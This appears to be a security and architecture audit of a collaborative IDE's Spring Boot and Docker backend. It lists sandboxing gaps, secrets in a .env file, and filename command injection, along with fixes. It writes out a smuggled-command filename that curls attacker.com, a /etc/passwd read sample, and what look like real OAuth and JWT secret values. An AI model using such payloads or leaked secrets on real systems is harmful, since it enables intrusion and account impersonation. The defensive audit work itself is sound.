# 🔴 Parallax — Deep Production Audit

> Conducted: 2026-05-26 | Auditor perspective: Principal Engineer / SRE / Security Reviewer
> **Verdict: NOT production-ready.** Multiple P0 blockers, critical security gaps, and fundamental architecture decisions that must be resolved before any real user traffic.

---

## Table of Contents

1. [P0 — Blocking: Code Execution Completely Broken](#p0--blocking-code-execution-completely-broken)
2. [P0 — Security: Secrets Committed to Git](#p0--security-secrets-committed-to-git)
3. [P0 — Security: Docker Container Escape / RCE Vectors](#p0--security-docker-container-escape--rce-vectors)
4. [P1 — Architecture: All State is Ephemeral](#p1--architecture-all-state-is-ephemeral)
5. [P1 — Architecture: H2 In-Memory Database in Production Config](#p1--architecture-h2-in-memory-database-in-production-config)
6. [P1 — Security: Command Injection via Filenames](#p1--security-command-injection-via-filenames)
7. [P2 — Architecture: In-Memory WebSocket Broker](#p2--architecture-in-memory-websocket-broker)
8. [P2 — Security: WebSocket Origin Wildcard on Raw Endpoints](#p2--security-websocket-origin-wildcard-on-raw-endpoints)
9. [P2 — Reliability: Execution Lock Memory Leak](#p2--reliability-execution-lock-memory-leak)
10. [P2 — Security: JWT Access Token in URL Parameter](#p2--security-jwt-access-token-in-url-parameter)
11. [P2 — Frontend: No Token Refresh Flow](#p2--frontend-no-token-refresh-flow)
12. [P3 — Reliability: Rate Limiter Memory Leak](#p3--reliability-rate-limiter-memory-leak)
13. [P3 — Database: Missing Indexes and Constraints](#p3--database-missing-indexes-and-constraints)
14. [P3 — Architecture: File Content in TEXT Columns](#p3--architecture-file-content-in-text-columns)
15. [P3 — Security: CORS Allows Only localhost](#p3--security-cors-allows-only-localhost)
16. [P3 — Observability: Zero Monitoring Infrastructure](#p3--observability-zero-monitoring-infrastructure)
17. [Minor Issues Catalog](#minor-issues-catalog)
18. [Prioritized Remediation Roadmap](#prioritized-remediation-roadmap)
19. [Architecture Verdict](#architecture-verdict)

---

## P0 — Blocking: Code Execution Completely Broken

> [!CAUTION]
> **This is the user-reported issue. Every language fails to execute. The core product feature is 100% non-functional.**

### Root Cause

The code execution engine in [RunCodeService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java) runs `docker run parallax-python-runner` (and analogous images for Java/JS/C++). These images **do not exist anywhere**:

- They are not published to any Docker registry (DockerHub, GHCR, ECR)
- They are not built as part of the startup process
- The `build.bat` / `build.sh` only runs `mvn clean compile` — **no Docker build step**
- There is no `docker-compose.yml` to orchestrate runner image builds

**Verification** — output of `docker images`:
```
py-collab-session:latest         ← only this exists (old collab image)
parallax-python-runner           ← MISSING
parallax-java-runner             ← MISSING
parallax-js-runner               ← MISSING
parallax-cpp-runner              ← MISSING
```

The exact error confirms this:
```
Unable to find image 'parallax-python-runner:latest' locally
docker: Error response from daemon: pull access denied for parallax-python-runner
```

### Severity: **🔴 CRITICAL — Complete feature outage**
### Blast Radius: **100%** of code execution attempts fail
### Probability: **100%** — deterministic, affects every user

### Fix

**Immediate** — Build all 4 runner images locally:

```bash
cd backend/parallax-python-runner/runner && docker build -t parallax-python-runner .
cd backend/parallax-java-runner/runner   && docker build -t parallax-java-runner .
cd backend/parallax-js-runner/runner     && docker build -t parallax-js-runner .    # if Dockerfile exists
cd backend/parallax-cpp-runner/runner    && docker build -t parallax-cpp-runner .
```

**Short-term** — Add a `docker-compose.yml` or a `build-runners.bat` script that builds all images before the backend can start.

**Long-term** — CI/CD pipeline must build and push these images to a registry. The backend should fail-fast at startup if `docker images` doesn't contain the required images.

---

## P0 — Security: Secrets Committed to Git

> [!CAUTION]
> **Real Google OAuth credentials and a production JWT secret are committed to the repository in plaintext.**

### Evidence

[.env](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/.env) contains:

```
JWT_SECRET=px-kJ7mN3qR8vW2xY5zA1bD4eF6gH9iL0oP3sT7uV2wX5yZ8...
GOOGLE_CLIENT_ID=787059042613-b6b56oae...apps.googleusercontent.com
GOOGLE_CLIENT_SECRET=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
```

While `.env` is in `.gitignore`, the file currently exists in the working tree. If it was ever committed (even once), the secret is in git history permanently.

**The JWT secret** means anyone who finds it can forge access tokens for any user.
**The Google OAuth secret** means anyone can impersonate your OAuth application.

### Fix

1. **Immediately rotate** the JWT secret and Google OAuth credentials
2. Run `git log --all --full-history -- backend/backend/.env` to check if it was ever committed
3. If yes, use `git filter-repo` to purge it from history
4. Use a secrets manager (Vault, AWS Secrets Manager) or at minimum environment variables injected at deploy time — never files in the repo

---

## P0 — Security: Docker Container Escape / RCE Vectors

> [!CAUTION]
> **The Docker containers run with full privileges, network access, and host filesystem mounts. User-submitted code can attack the host machine.**

### Analysis of [RunCodeService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java#L123-L184)

The Docker command constructed is:
```
docker run --rm -v /tmp/parallax-run-XXXX:/workspace -w /workspace parallax-python-runner python3 ...
```

**Missing critical sandboxing flags:**

| Missing Flag | Impact |
|---|---|
| `--network=none` | User code can make HTTP requests, exfiltrate data, mine crypto, DDoS |
| `--memory=256m` | Fork bomb / OOM kills the host |
| `--cpus=0.5` | CPU starvation of the host |
| `--pids-limit=100` | Fork bomb creates unlimited processes |
| `--read-only` | User code can write to container filesystem |
| `--security-opt=no-new-privileges` | User can escalate privileges |
| `--user=nobody` | Runs as root inside container |
| `--tmpfs /tmp:noexec,nosuid,size=64m` | No temp space limits |

### Chaos Scenario

A malicious user submits this Python file:
```python
import subprocess
subprocess.run(["cat", "/workspace/../../../etc/passwd"])  # read host files via volume mount
```

Or worse — the `-v` mount gives read-write access to the temp directory. User code could write a symlink that escapes the container boundary on certain Docker versions.

### Fix

```java
cmd.add("--network=none");
cmd.add("--memory=256m");
cmd.add("--cpus=0.5");
cmd.add("--pids-limit=100");
cmd.add("--read-only");
cmd.add("--security-opt=no-new-privileges");
cmd.add("--user=65534:65534");  // nobody
cmd.add("--tmpfs=/tmp:noexec,nosuid,size=64m");
```

---

## P1 — Architecture: All State is Ephemeral

> [!WARNING]
> **`SessionRegistry`, `ExecutionLockService`, `RunRateLimiter`, and WebSocket presence are all in-memory `ConcurrentHashMap`s. A JVM restart or deploy loses everything.**

### Affected Components

| Component | File | Impact on Restart |
|---|---|---|
| Active sessions | [SessionRegistry.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/store/SessionRegistry.java) | All collaboration sessions vanish. Users see "No active session" |
| Execution locks | [ExecutionLockService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/ExecutionLockService.java) | Lock state lost. Parallel executions possible. Inconsistent state |
| Rate limits | [RunRateLimiter.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunRateLimiter.java) | Rate limits reset. Burst exploitation possible |
| Presence | SessionRegistry | All "who's online" info vanishes |
| WS mappings | SessionRegistry `wsToUser`/`wsToProject` | WebSocket routing broken |

### Production Impact

- **Zero-downtime deploys are impossible.** Every rolling restart nukes active collaboration sessions.
- **Horizontal scaling is impossible.** If you add a second backend instance, it has its own empty SessionRegistry. Users connected to instance A cannot see users on instance B.

### Fix

- Move session state to **Redis** with TTL-based expiry
- Use Redis-backed distributed locks (Redisson)
- Use Redis-backed rate limiting

---

## P1 — Architecture: H2 In-Memory Database in Production Config

> [!WARNING]
> **The application uses `jdbc:h2:mem:parallax` — an in-memory database. All data is lost on every restart.**

From [application.properties](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/resources/application.properties#L4):
```properties
spring.datasource.url=${DB_URL:jdbc:h2:mem:parallax;DB_CLOSE_DELAY=-1;MODE=PostgreSQL}
```

And `.env` defaults confirm this is actually used:
```
DB_URL=jdbc:h2:mem:parallax;DB_CLOSE_DELAY=-1;MODE=PostgreSQL
```

### Impact

- Every restart erases all users, projects, files, chat history, teams, collaborators
- `spring.jpa.hibernate.ddl-auto=update` combined with H2 means schema is auto-generated — no migration tracking
- `MODE=PostgreSQL` simulates Postgres syntax but has subtly different behavior for edge cases (JSON operations, CTEs, window functions)

### Fix

- Development: Use `jdbc:h2:file:./data/parallax` at minimum (file-based H2)
- Production: **PostgreSQL** is already in `pom.xml` as a runtime dependency — switch to it
- Use Flyway or Liquibase for schema migrations instead of `ddl-auto=update`

---

## P1 — Security: Command Injection via Filenames

> [!WARNING]
> **Java and C/C++ execution paths concatenate user-controlled filenames into shell commands without escaping.**

From [RunCodeService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java#L149-L169):

```java
// Java path:
cmd.add("cd " + dir + " && java " + shortName);

// C path:
cmd.add("gcc " + safePath + " -o out && ./out");
```

The `sanitizeUserPath` method in `FileSyncService` blocks `..` and `\0`, but does NOT block shell metacharacters like `;`, `|`, `$()`, backticks, `&&`, etc.

### Reproduction

Create a file named: `src/main; curl attacker.com/pwned`
The resulting Docker command becomes:
```
sh -c "cd src/main; curl attacker.com/pwned && java ..."
```

### Fix

1. **Whitelist** valid filename characters: `[a-zA-Z0-9._/-]`
2. Do NOT pass user-controlled strings into `sh -c` — use `ProcessBuilder` with separate arguments
3. For Java: `cmd.addAll(List.of("java", "-cp", dir, className))` — no shell

---

## P2 — Architecture: In-Memory WebSocket Broker

From [WebSocketConfig.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/config/WebSocketConfig.java#L29):
```java
config.enableSimpleBroker("/topic", "/queue")
```

This uses Spring's **SimpleBroker** — all pub/sub happens in JVM memory. This means:
- Cannot horizontally scale (user A on instance 1 can't receive messages from user B on instance 2)
- All subscriptions lost on restart
- No message durability or replay

**Fix:** Use an external STOMP broker (RabbitMQ with STOMP plugin) or switch to a Redis Pub/Sub adapter.

---

## P2 — Security: WebSocket Origin Wildcard on Raw Endpoints

From [WebSocketConfig.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/config/WebSocketConfig.java#L84-L94):

```java
registry.addHandler(chatHandler, "/ws/chat/{projectId}")
    .setAllowedOriginPatterns("*");  // ← WIDE OPEN

registry.addHandler(teamChatHandler, "/ws/team-chat/{teamId}")
    .setAllowedOriginPatterns("*");  // ← WIDE OPEN

registry.addHandler(directChatHandler, "/ws/direct-chat")
    .setAllowedOriginPatterns("*");  // ← WIDE OPEN
```

The STOMP endpoint correctly restricts to `localhost:3000`, but the **raw WebSocket chat handlers accept connections from any origin**. Any webpage can open a WebSocket to your chat endpoints and read/send messages if they have a valid JWT.

**Fix:** Restrict to `http://localhost:3000` (or your production domain).

---

## P2 — Reliability: Execution Lock Memory Leak

[ExecutionLockService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/ExecutionLockService.java) uses a `ConcurrentHashMap<UUID, AtomicBoolean>` that **never removes entries**. Every project that ever runs code adds an entry. Over time, this leaks memory.

Additionally, if `RunCodeService.runCodeInSession` throws an exception **before** the inner `try` block is entered (e.g., during `executionCoordinator.flushBeforeExecution`), the `unlock()` in the `finally` block still fires — but if the exception happens **before** `tryLock()`, the lock was never acquired and `unlock()` is a no-op. However, if the exception happens between `tryLock()` returning `true` and the `flushBeforeExecution()` call — specifically during `accessManager.require()` on line 85 — the lock IS correctly released. This is OK but fragile.

**Fix:** Add periodic cleanup or use entries with TTL. Use `ReentrantLock` or a Redis-based lock.

---

## P2 — Security: JWT Access Token in URL Parameter

From [JwtAuthenticationFilter.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/security/JwtAuthenticationFilter.java#L98-L102):

```java
// Optional legacy support (NOT recommended for prod)
String param = request.getParameter("access_token");
if (param != null && !param.isBlank()) {
    return "Bearer " + param;
}
```

Tokens in URL parameters are logged in server access logs, browser history, proxy logs, referrer headers, and can be cached. This is a known vulnerability (OWASP).

**Fix:** Remove this code path entirely. WebSocket auth should use the STOMP `CONNECT` header (which you already do correctly).

---

## P2 — Frontend: No Token Refresh Flow

The frontend stores `access_token` in `localStorage` and checks expiry client-side in [RequireAuth.tsx](file:///c:/CipherVault/Code/Projects/Parallax/frontend/src/auth/RequireAuth.tsx). But:

1. **No automatic refresh.** When the access token expires (1 hour), the user is silently logged out. The backend has a full refresh token rotation flow (`rotateRefresh`), but the frontend **never calls it**.
2. **No axios interceptor** for 401 responses that would trigger a refresh and retry.
3. The WebSocket interceptor checks `jwt_expiry` and throws `"WebSocket token expired"` — but the frontend has no reconnection logic that would re-authenticate with a fresh token.

**Impact:** Users in the middle of a coding session lose their connection after 1 hour with no recovery.

**Fix:** Add a response interceptor to `api.ts` that catches 401s, calls the refresh endpoint, and retries. Also implement WebSocket reconnection with fresh tokens.

---

## P3 — Reliability: Rate Limiter Memory Leak

[RunRateLimiter.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunRateLimiter.java) stores `Deque<Instant>` per project ID and never evicts old project entries. Over thousands of projects, the map grows unboundedly.

**Fix:** Use a scheduled cleanup task or Caffeine cache with automatic eviction.

---

## P3 — Database: Missing Indexes and Constraints

| Table/Query | Issue |
|---|---|
| `project_files.findByProjectIdAndPath` | No composite index on `(project_id, path)` — full table scan per lookup |
| `project_files.findByProjectId` | No index on `project_id` alone |
| `project_files` | No unique constraint on `(project_id, path)` — duplicates possible |
| `ProjectFile.type` | String instead of enum — invalid values possible |
| `Project.language` | String without validation — any value accepted |

**Fix:** Add `@Table(uniqueConstraints = @UniqueConstraint(columnNames = {"project_id", "path"}))` and JPA `@Index` annotations.

---

## P3 — Architecture: File Content in TEXT Columns

[ProjectFile.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/entity/file/ProjectFile.java#L21-L22) stores file content as `@Column(columnDefinition = "TEXT")`. For projects with many files or large files:

- `findByProjectId` loads **ALL file contents** into memory at once — OOM risk
- Every `writeProjectSnapshot` call loads every file's content from DB then writes to disk

**Fix:** Use lazy fetching for `content`, or split content into a separate table. For binary files, use blob storage (S3).

---

## P3 — Security: CORS Allows Only localhost

From [SecurityConfig.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/config/SecurityConfig.java#L62-L65):
```java
cfg.setAllowedOriginPatterns(List.of(
    "http://localhost:3000",
    "http://localhost:3001"
));
```

This is fine for dev, but deploying to a real domain will break all API calls. This must be configurable via environment variable.

---

## P3 — Observability: Zero Monitoring Infrastructure

- `spring-boot-starter-actuator` is included but no metrics endpoint is exposed
- No Prometheus metrics, no Grafana dashboards
- No structured logging (JSON format for log aggregation)
- No distributed tracing (OpenTelemetry)
- No alerting on execution failures, WebSocket disconnections, auth failures
- No health check for Docker daemon availability (the runner images being missing went undetected)

---

## Minor Issues Catalog

| # | Issue | File | Severity |
|---|---|---|---|
| 1 | `python-runner` Dockerfile has `ENTRYPOINT ["python", "-u"]` but `RunCodeService` overrides with `python3 __runner__.py` — ENTRYPOINT is ignored because CMD args override it | [Dockerfile](file:///c:/CipherVault/Code/Projects/Parallax/backend/parallax-python-runner/runner/Dockerfile) | Low |
| 2 | `js-runner` directory exists but Dockerfile not verified | N/A | Med |
| 3 | `passwordHash` column set to `nullable = false` but OAuth users get `"OAUTH_NO_PASSWORD"` as hash — schema semantics broken | [User.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/entity/auth/User.java#L27-L28) | Low |
| 4 | `jjwt` version 0.11.5 is outdated — current is 0.12.x with API changes | [pom.xml](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/pom.xml#L63-L78) | Low |
| 5 | `spring-boot-starter-webflux` included but no reactive endpoints used — adds Netty to classpath unnecessarily, potential conflicts | [pom.xml](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/resources/application.properties) | Low |
| 6 | Backend runtime Dockerfile uses `eclipse-temurin:21-jdk` — should use `21-jre` for smaller image | [Dockerfile](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/Dockerfile#L11) | Low |
| 7 | `streamOutput` thread name uses `projectId` which can be very long — minor log readability issue | [RunCodeService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java#L196) | Trivial |
| 8 | `safeDeleteDirectory` silently fails on Windows — temp files may accumulate | [RunCodeService.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/execution/RunCodeService.java#L278) | Med |
| 9 | Frontend `localStorage` for JWT — vulnerable to XSS. HttpOnly cookies are safer | [api.ts](file:///c:/CipherVault/Code/Projects/Parallax/frontend/src/services/api.ts#L10) | Med |
| 10 | `show-sql=true` in application.properties — performance and log noise in production | [application.properties](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/resources/application.properties#L8) | Low |
| 11 | `ProjectAccessManagerImpl.require()` checks permission THEN checks status — should check status first (cheaper query path) | [ProjectAccessManagerImpl.java](file:///c:/CipherVault/Code/Projects/Parallax/backend/backend/src/main/java/com/parallax/backend/parallax/service/project/ProjectAccessManagerImpl.java#L36-L48) | Trivial |
| 12 | TypeScript compilation has 50+ errors (radix-ui version mismatches, missing types) — indicates dependency rot | N/A | Med |

---

## Prioritized Remediation Roadmap

### 🔴 Immediate (Do Today)

| # | Action | Effort |
|---|---|---|
| 1 | **Build all 4 Docker runner images** from existing Dockerfiles | 5 min |
| 2 | **Add Docker sandbox flags** (`--network=none`, `--memory`, `--cpus`, `--pids-limit`, `--read-only`, `--user=nobody`, `--security-opt`) to `RunCodeService` | 30 min |
| 3 | **Rotate JWT secret and Google OAuth credentials** | 15 min |
| 4 | **Verify `.env` was never committed** to git history | 5 min |
| 5 | **Add filename whitelist validation** to block shell metacharacters (`[a-zA-Z0-9._/-]` only) | 15 min |
| 6 | **Remove `access_token` URL parameter support** from `JwtAuthenticationFilter` | 5 min |

### 🟡 Short-term (This Week)

| # | Action | Effort |
|---|---|---|
| 7 | Create `build-runners.bat/sh` script that builds all Docker images | 30 min |
| 8 | Switch from H2 in-memory to H2 file-mode or PostgreSQL for dev | 1 hr |
| 9 | Fix raw WebSocket origin patterns from `*` to explicit origins | 15 min |
| 10 | Add Docker daemon health check on backend startup | 1 hr |
| 11 | Make CORS origins configurable via `app.frontend.url` | 30 min |
| 12 | Fix TypeScript compilation errors (dependency version mismatches) | 2 hr |

### 🔵 Medium-term (This Month)

| # | Action | Effort |
|---|---|---|
| 13 | Move SessionRegistry/locks/rate-limits to **Redis** | 2-3 days |
| 14 | Implement frontend token refresh interceptor | 1 day |
| 15 | Add database indexes and unique constraints | 2 hr |
| 16 | Add Flyway for schema migrations, remove `ddl-auto=update` | 1 day |
| 17 | Add structured logging (JSON) and basic Prometheus metrics | 1 day |
| 18 | Implement WebSocket reconnection with fresh tokens on frontend | 1 day |
| 19 | Lazy-load file content in `ProjectFile` entity | 3 hr |

### ⚪ Long-term (Next Quarter)

| # | Action | Effort |
|---|---|---|
| 20 | Replace `SimpleBroker` with RabbitMQ STOMP broker for horizontal scaling | 3-5 days |
| 21 | Container orchestration with Kubernetes + proper runner pod sandboxing (gVisor/Firecracker) | 2-3 weeks |
| 22 | Move JWT to HttpOnly cookies, implement CSRF protection | 3-5 days |
| 23 | File content to object storage (S3/MinIO) for large files | 1 week |
| 24 | CI/CD pipeline (GitHub Actions) with automated runner image builds, tests, deploy | 2-3 days |
| 25 | Distributed tracing (OpenTelemetry) | 2-3 days |

---

## Architecture Verdict

### Should this be rewritten? **No.**

The core architecture is **sound for a v0.5 prototype**: Spring Boot + React + WebSocket + Docker-based code execution is a valid stack for a collaborative IDE. The domain model separation (controllers/services/entities/repos) follows good conventions. The RBAC permission matrix is well-designed. The JWT token rotation flow is correct.

### What must change before any real users?

1. **The Docker execution pipeline** is the flagship feature and it's both broken AND dangerous. Fix the image builds and add sandboxing — this is item #1 and #2.
2. **State management** — the in-memory approach works for a single-instance demo but MUST move to Redis before any real deployment. This is the biggest architectural investment needed.
3. **Persistence** — move to PostgreSQL and Flyway migrations. H2 in-memory is a ticking time bomb.

### What's actually good?

- Clean separation of concerns in the backend
- Proper use of `@Transactional` with `readOnly` annotations
- Good JWT implementation with access/refresh token separation and token hashing
- Well-designed RBAC matrix with fail-closed defaults
- Path traversal prevention in `FileSyncService` (double validation: `sanitizeUserPath` + `resolvePathSafely`)
- WebSocket STOMP authentication via interceptor is correctly implemented
- Execution lock prevents parallel code runs per project (correct intent, wrong implementation)

The codebase demonstrates real engineering judgment in many areas. The issues identified are typical for a project that evolved from prototype to demo without a production-hardening pass. The fix path is clear, incremental, and doesn't require a rewrite.
